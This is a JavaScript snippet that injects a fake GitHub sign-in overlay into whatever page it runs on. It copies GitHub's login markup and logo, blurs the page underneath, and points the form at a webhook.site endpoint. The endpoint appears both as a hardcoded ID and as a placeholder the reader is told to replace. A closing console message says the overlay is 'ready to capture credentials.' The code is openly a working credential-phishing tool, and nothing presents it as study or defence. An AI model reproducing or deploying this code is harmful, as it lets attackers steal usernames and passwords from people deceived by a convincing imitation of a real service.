(function() {
    // GitHub's exact login HTML structure (copied and adapted from the real page)
    const loginHTML = `
    <div class="auth-form px-3" style="max-width: 340px; margin: 0 auto;">
        <div class="text-center mb-4">
            <svg height="48" viewBox="0 0 24 24" version="1.1" width="48" aria-hidden="true" style="fill: #24292f;">
                <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.163-1.179 3.163-1.179.632 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75z"/>
            </svg>
        </div>

        <div class="Box Box--rounded">
            <div class="Box-body p-4">
                <h1 class="h3-mktg mb-3 text-center" style="font-weight: 400;">Sign in to GitHub</h1>

                <form class="home-signup-form" action="https://webhook.site/9a52d166-8b42-4f2f-bb2d-484ca6868fa0" method="POST">
                    <div class="form-group mb-3">
                        <label for="login_field" class="form-label">Username or email address</label>
                        <input type="text" name="login" id="login_field" class="form-control" autofocus="autofocus" autocorrect="off" autocomplete="username" required>
                    </div>

                    <div class="form-group mb-3">
                        <div class="d-flex flex-justify-between">
                            <label for="password" class="form-label">Password</label>
                            <a href="/password_reset" class="color-fg-muted">Forgot password?</a>
                        </div>
                        <input type="password" name="password" id="password" class="form-control" autocomplete="current-password" required>
                    </div>

                    <div class="form-group mb-3">
                        <button type="submit" class="btn btn-primary btn-block">Sign in</button>
                    </div>

                    <div class="form-group mb-3 text-center">
                        <span class="text-small color-fg-muted">or</span>
                    </div>

                    <div class="form-group mb-2">
                        <button type="button" class="btn btn-block" style="background: none; border: 1px solid #d0d7de;">
                            <svg width="20" height="20" viewBox="0 0 24 24" style="margin-right: 8px; vertical-align: middle;">
                                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                            </svg>
                            Continue with Google
                        </button>
                    </div>

                    <div class="form-group mb-3">
                        <button type="button" class="btn btn-block" style="background: none; border: 1px solid #d0d7de;">
                            <svg width="20" height="20" viewBox="0 0 24 24" style="margin-right: 8px; vertical-align: middle;">
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#24292f"/>
                            </svg>
                            Continue with Apple
                        </button>
                    </div>
                </form>

                <p class="text-center text-small color-fg-muted mt-3">
                    New to GitHub? <a href="/signup">Create an account</a>
                </p>
            </div>
        </div>

        <div class="text-center text-small color-fg-muted mt-3">
            <a href="/login?return_to=%2Flogin" class="mr-2">Sign in with a passkey</a>
        </div>

        <div class="text-center text-small color-fg-muted mt-4">
            <a href="/terms">Terms</a> 
            <a href="/privacy" class="ml-2">Privacy</a> 
            <a href="/docs" class="ml-2">Docs</a> 
            <a href="/contact" class="ml-2">Contact GitHub Support</a> 
            <a href="/cookies" class="ml-2">Manage cookies</a>
            <a href="#" class="ml-2">Do not share my personal information</a>
        </div>
    </div>
    `;

    // Create the overlay with blur effect
    document.body.insertAdjacentHTML('beforeend', `
    <div id="github-login-overlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center; z-index:999999; overflow-y:auto; padding:20px;">
        <div style="background:white; border-radius:6px; padding:20px; max-width:440px; width:100%; box-shadow:0 8px 24px rgba(0,0,0,0.2);">
            ${loginHTML}
        </div>
    </div>`);

    // Set the webhook URL - REPLACE THIS WITH YOUR WEBHOOK.SITE ID
    const webhookURL = 'https://webhook.site/YOUR-ID'; // <-- CHANGE THIS!
    
    // Update form action
    const form = document.querySelector('#github-login-overlay form');
    if (form) {
        form.action = webhookURL;
        form.method = 'POST';
        
        // Log submissions for debugging
        form.addEventListener('submit', function(e) {
            console.log('Form submitted to:', webhookURL);
        });
    }

    // Apply blur to background
    document.body.style.filter = 'blur(3px)';
    document.body.style.transition = 'filter 0.3s ease';

    // Close overlay when clicking outside or pressing Escape
    const overlay = document.getElementById('github-login-overlay');
    
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay) {
            overlay.remove();
            document.body.style.filter = 'none';
        }
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            const existingOverlay = document.getElementById('github-login-overlay');
            if (existingOverlay) {
                existingOverlay.remove();
                document.body.style.filter = 'none';
            }
        }
    });

    // Add Bootstrap for better styling (optional but makes it look perfect)
    if (!document.querySelector('link[href*="bootstrap"]')) {
        const bootstrapLink = document.createElement('link');
        bootstrapLink.rel = 'stylesheet';
        bootstrapLink.href = 'https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css';
        document.head.appendChild(bootstrapLink);
    }

    // Add FontAwesome for icons
    if (!document.querySelector('script[src*="fontawesome"]')) {
        const faScript = document.createElement('script');
        faScript.src = 'https://kit.fontawesome.com/bc213df0cb.js';
        faScript.crossOrigin = 'anonymous';
        document.head.appendChild(faScript);
    }

    console.log('GitHub login overlay loaded! Ready to capture credentials.');
})();
